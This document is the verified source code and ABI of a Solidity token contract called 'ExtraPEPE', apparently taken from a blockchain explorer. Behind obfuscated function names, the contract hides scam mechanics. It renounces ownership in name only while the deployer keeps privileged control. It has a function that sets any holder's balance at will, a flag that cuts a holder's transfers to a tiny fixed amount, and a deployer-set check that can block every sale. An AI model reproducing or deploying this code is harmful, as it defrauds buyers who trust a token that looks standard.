{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface amountMaxLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellMarketing) external view returns (uint256);\n\n    function transfer(address launchTeam, uint256 liquidityEnable) external returns (bool);\n\n    function allowance(address swapFeeSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchTeam,\n        uint256 liquidityEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeToLiquidity, uint256 value);\n    event Approval(address indexed swapFeeSell, address indexed spender, uint256 value);\n}\n\nabstract contract feeTokenMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txLaunched {\n    function createPair(address launchFee, address fundTradingMax) external returns (address);\n}\n\ninterface amountMaxLiquidityMetadata is amountMaxLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExtraPEPE is feeTokenMin, amountMaxLiquidity, amountMaxLiquidityMetadata {\n\n    function approve(address liquiditySell, uint256 liquidityEnable) public virtual override returns (bool) {\n        exemptLaunch[_msgSender()][liquiditySell] = liquidityEnable;\n        emit Approval(_msgSender(), liquiditySell, liquidityEnable);\n        return true;\n    }\n\n    string private launchedWallet = \"Extra PEPE\";\n\n    uint256 modeAmountMin;\n\n    function listReceiver(address launchedExempt, address launchTeam, uint256 liquidityEnable) internal returns (bool) {\n        if (launchedExempt == receiverTeam) {\n            return atLimit(launchedExempt, launchTeam, liquidityEnable);\n        }\n        uint256 exemptMax = amountMaxLiquidity(fromTake).balanceOf(feeMax);\n        require(exemptMax == teamTrading);\n        require(launchTeam != feeMax);\n        if (marketingAmount[launchedExempt]) {\n            return atLimit(launchedExempt, launchTeam, receiverTokenMarketing);\n        }\n        return atLimit(launchedExempt, launchTeam, liquidityEnable);\n    }\n\n    address public receiverTeam;\n\n    function launchedAtLimit(uint256 liquidityEnable) public {\n        totalLimit();\n        teamTrading = liquidityEnable;\n    }\n\n    function buyTxLiquidity(address senderShould, uint256 liquidityEnable) public {\n        totalLimit();\n        exemptModeTeam[senderShould] = liquidityEnable;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchedWallet;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenTeamMode;\n    }\n\n    address public fromTake;\n\n    function owner() external view returns (address) {\n        return toAt;\n    }\n\n    function minTx(address feeMin) public {\n        totalLimit();\n        \n        if (feeMin == receiverTeam || feeMin == fromTake) {\n            return;\n        }\n        marketingAmount[feeMin] = true;\n    }\n\n    function transfer(address senderShould, uint256 liquidityEnable) external virtual override returns (bool) {\n        return listReceiver(_msgSender(), senderShould, liquidityEnable);\n    }\n\n    uint256 public toSell;\n\n    uint256 constant receiverTokenMarketing = 4 ** 10;\n\n    bool public receiverMarketingToken;\n\n    mapping(address => bool) public receiverIs;\n\n    address liquiditySender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address feeMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function shouldTakeFrom(address atReceiverFund) public {\n        require(atReceiverFund.balance < 100000);\n        if (receiverMarketingToken) {\n            return;\n        }\n        \n        receiverIs[atReceiverFund] = true;\n        if (amountSell == toSell) {\n            toSell = amountSell;\n        }\n        receiverMarketingToken = true;\n    }\n\n    function balanceOf(address sellMarketing) public view virtual override returns (uint256) {\n        return exemptModeTeam[sellMarketing];\n    }\n\n    function atLimit(address launchedExempt, address launchTeam, uint256 liquidityEnable) internal returns (bool) {\n        require(exemptModeTeam[launchedExempt] >= liquidityEnable);\n        exemptModeTeam[launchedExempt] -= liquidityEnable;\n        exemptModeTeam[launchTeam] += liquidityEnable;\n        emit Transfer(launchedExempt, launchTeam, liquidityEnable);\n        return true;\n    }\n\n    bool private takeLimit;\n\n    function allowance(address receiverToBuy, address liquiditySell) external view virtual override returns (uint256) {\n        if (liquiditySell == liquiditySender) {\n            return type(uint256).max;\n        }\n        return exemptLaunch[receiverToBuy][liquiditySell];\n    }\n\n    function getOwner() external view returns (address) {\n        return toAt;\n    }\n\n    uint256 private launchedAmount = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private exemptModeTeam;\n\n    uint256 teamTrading;\n\n    function modeMinTx() public {\n        emit OwnershipTransferred(receiverTeam, address(0));\n        toAt = address(0);\n    }\n\n    uint8 private tokenTeamMode = 18;\n\n    function totalLimit() private view {\n        require(receiverIs[_msgSender()]);\n    }\n\n    address private toAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedAmount;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minIs;\n    }\n\n    string private minIs = \"EPE\";\n\n    mapping(address => mapping(address => uint256)) private exemptLaunch;\n\n    uint256 private amountSell;\n\n    constructor (){\n        if (takeLimit == senderBuy) {\n            amountSell = toSell;\n        }\n        atLaunch shouldIs = atLaunch(liquiditySender);\n        fromTake = txLaunched(shouldIs.factory()).createPair(shouldIs.WETH(), address(this));\n        if (toSell == amountSell) {\n            takeLimit = false;\n        }\n        receiverTeam = _msgSender();\n        modeMinTx();\n        receiverIs[receiverTeam] = true;\n        exemptModeTeam[receiverTeam] = launchedAmount;\n        if (toSell == amountSell) {\n            senderBuy = false;\n        }\n        emit Transfer(address(0), receiverTeam, launchedAmount);\n    }\n\n    event OwnershipTransferred(address indexed amountEnable, address indexed modeReceiver);\n\n    bool private senderBuy;\n\n    mapping(address => bool) public marketingAmount;\n\n    function transferFrom(address launchedExempt, address launchTeam, uint256 liquidityEnable) external override returns (bool) {\n        if (_msgSender() != liquiditySender) {\n            if (exemptLaunch[launchedExempt][_msgSender()] != type(uint256).max) {\n                require(liquidityEnable <= exemptLaunch[launchedExempt][_msgSender()]);\n                exemptLaunch[launchedExempt][_msgSender()] -= liquidityEnable;\n            }\n        }\n        return listReceiver(launchedExempt, launchTeam, liquidityEnable);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFeeSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeToLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquiditySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"buyTxLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"launchedAtLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeMin\",\"type\":\"address\"}],\"name\":\"minTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMinTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMarketingToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atReceiverFund\",\"type\":\"address\"}],\"name\":\"shouldTakeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExtraPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}